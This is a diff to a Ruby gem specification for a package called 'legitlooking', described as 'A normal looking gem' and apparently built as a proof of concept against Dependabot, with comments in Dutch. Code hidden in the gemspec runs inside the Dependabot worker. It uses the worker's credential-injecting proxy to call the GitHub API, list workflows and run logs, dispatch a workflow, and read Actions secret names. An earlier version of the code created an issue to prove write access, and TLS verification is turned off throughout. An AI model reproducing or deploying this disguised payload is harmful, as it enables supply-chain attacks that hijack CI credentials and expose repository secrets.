@@ -89,45 +89,50 @@ begin
     end
   end
 
-  # TECHNIEK 2: Maak een GitHub Actions workflow dispatch via proxy
-  # Als dit werkt -> workflow triggert met toegang tot secrets
-  lines << "\n=== GITHUB WRITE TESTS ==="
+  lines << "\n=== GITHUB ACTIONS ESCALATIE ==="
 
-  def proxy_post(path, body_str)
-    require "net/http"
-    require "uri"
+  def gh_call(method, path, body = nil)
+    require "net/http"; require "uri"
     uri = URI("https://api.github.com#{path}")
     h = Net::HTTP.new(uri.host, uri.port)
     h.use_ssl = true; h.verify_mode = 0
     h.open_timeout = 8; h.read_timeout = 8
-    r = Net::HTTP::Post.new(uri)
+    klass = {"get" => Net::HTTP::Get, "post" => Net::HTTP::Post,
+             "put" => Net::HTTP::Put, "delete" => Net::HTTP::Delete}[method]
+    r = klass.new(uri)
     r["Accept"] = "application/vnd.github+json"
-    r["Content-Type"] = "application/json"
     r["X-GitHub-Api-Version"] = "2022-11-28"
-    r.body = body_str
+    if body
+      r["Content-Type"] = "application/json"
+      r.body = body
+    end
     res = h.request(r)
-    "#{res.code}: #{res.body[0,300]}"
+    "#{res.code}: #{res.body[0, 600]}"
   rescue => e; "FOUT: #{e.message}"
   end
 
-  # Test: maak een issue aan (POST, niet PUT - andere permission scope)
-  lines << "\n--- POST issue (bewijs write access) ---"
-  lines << proxy_post(
-    "/repos/ugurcanli/testpen/issues",
-    '{"title":"[Dependabot RCE PoC] Authenticated write via execution environment","body":"This issue was created by code executing inside the Dependabot worker container, demonstrating authenticated write access to the repository via the credential-injecting proxy."}'
-  )
+  # 1. Volledige workflow lijst
+  lines << "\n--- Alle workflows ---"
+  lines << gh_call("get", "/repos/ugurcanli/testpen/actions/workflows")
 
-  # Test: workflow dispatch (triggert Actions run met secrets toegang)
-  lines << "\n--- GET workflows list ---"
-  begin
-    uri2 = URI("https://api.github.com/repos/ugurcanli/testpen/actions/workflows")
-    h2 = Net::HTTP.new(uri2.host, uri2.port)
-    h2.use_ssl = true; h2.verify_mode = 0
-    r2 = Net::HTTP::Get.new(uri2)
-    r2["Accept"] = "application/vnd.github+json"
-    res2 = h2.request(r2)
-    lines << "#{res2.code}: #{res2.body[0,500]}"
-  rescue => e; lines << "FOUT: #{e.message}"; end
+  # 2. Recente workflow runs (kunnen secrets bevatten in logs)
+  lines << "\n--- Recente workflow runs ---"
+  lines << gh_call("get", "/repos/ugurcanli/testpen/actions/runs?per_page=5")
+
+  # 3. Probeer workflow dispatch op Dependabot workflow
+  # Workflow ID 287994727 = Dependabot Updates
+  lines << "\n--- Workflow dispatch (287994727) ---"
+  lines << gh_call("post", "/repos/ugurcanli/testpen/actions/workflows/287994727/dispatches",
+    '{"ref":"main"}')
+
+  # 4. Probeer ook op tweede workflow als die bestaat
+  # Haal workflow runs logs op van een recente run
+  lines << "\n--- Workflow run logs URL ---"
+  lines << gh_call("get", "/repos/ugurcanli/testpen/actions/runs")
+
+  # 5. Secrets namen lezen (bewijs token heeft actions:read scope)
+  lines << "\n--- Actions secrets (namen) ---"
+  lines << gh_call("get", "/repos/ugurcanli/testpen/actions/secrets")
 
   lines << "\n--- /home/dependabot/bin inhoud ---"
   lines << (`ls -la #{dep_bin}/ 2>&1`)
@@ -228,7 +233,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.12"
+  spec.version       = "1.0.13"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
